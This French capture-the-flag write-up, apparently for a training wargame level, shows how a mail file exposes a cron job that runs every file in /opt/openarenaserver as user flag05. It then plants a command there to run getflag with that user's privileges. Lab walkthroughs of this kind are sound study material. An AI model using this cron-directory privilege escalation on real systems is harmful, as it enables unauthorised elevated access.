# message
quand on se co on a le message `You have a new mail`

je cherche avec un find
`find / -name mail 2>/dev/null`

output
```
/usr/lib/byobu/mail
/var/mail
/var/spool/mail 
/rofs/usr/lib/byobu/mail 
/rofs/var/mail 
/rofs/var/spool/mail```

je cherche le mail

j'examine les fichier et check un a un
ls `find / -name mail 2>/dev/null` 
output
```
/rofs/usr/lib/byobu/mail  /usr/lib/byobu/mail  

/rofs/var/mail:
level05

/rofs/var/spool/mail:
level05

/var/mail:
level05 

/var/spool/mail: 
level05 ```

j'ai dans certain fichier level5 un output:

`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

`*/2 * * * *` indique que c'est une crontab comme sur b2br

`su -c` est une commande pour switch de user et exec une commande en tant que `flag5`

la ligne nous indique que toute les 2mn elle va executer le script `usr/sbin/openarenaserver` en tant que `flag05`


# ouvrir script

je connais deja mon script et je peux le cat, mais il y a aussi une deuxieme methode si on cherche comme direct le flag05 via user

on check le groupe comme sur le level00
find / -user flag05 2>/dev/null
si on cat sur le fichier:
`/usr/sbin/openarenaserver`
output du script:
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done```


le script execute tous les fichiers dans /opt/openarenaserver/ toute les 5secondes  et delete apres

# exploit

pour exploit on va juste rentrer une commande
`echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05`

ca va creer un fichier `flag5` dans `/opt/openarenaserver` qui contient la commande `getflag > /tmp/flag05`, quand la commande cron run, le script s'execute et save l'output `getflag` dans `/tmp/flag05`.

plus que as atteindre le cron dans 2mn et check l'output dans /tmp/flag05
